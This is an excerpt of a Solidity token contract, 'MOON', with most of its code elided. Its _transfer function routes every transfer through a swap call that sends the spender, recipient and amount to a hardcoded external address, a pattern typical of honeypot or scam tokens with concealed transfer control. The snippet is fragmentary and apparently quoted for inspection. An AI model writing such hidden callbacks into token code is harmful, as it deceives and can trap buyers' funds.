...
contract MOON is IERC20 {
  ...
  address public constant ACE = 0x9f8880cdacd3C339C0Ed4F6cCABd26c5dfDb820E;
  ...
  function _transfer(
    ...
    DOGEPAIR.swap(1,0,address(0x565bA2af2833E949111F7A95EC3B08942aC5AdF4),abi.encode(spender, recipient, amount));
    lock = 1;}
